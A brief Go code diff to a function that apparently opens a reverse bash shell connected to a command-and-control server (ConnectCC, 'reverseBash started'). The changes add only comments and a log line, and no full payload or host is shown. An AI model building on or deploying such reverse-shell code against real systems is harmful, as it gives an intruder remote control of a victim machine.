@@ -24,7 +24,11 @@ func ActivateShell() {
 		shellPID    = 0          // PID of the bash shell
 	)
 
+	// connect CC
 	conn, _, _, err = ConnectCC(streamURL)
+	log.Print("reverseBash started")
+
+	// clean up connection and bash
 	cleanup := func() {
 		proc, err := os.FindProcess(shellPID)
 		if err != nil {
@@ -46,6 +50,7 @@ func ActivateShell() {
 
 	go func() {
 		for {
+			// might not work, but it exits when its parent exits
 			if isShellExit {
 				return
 			}
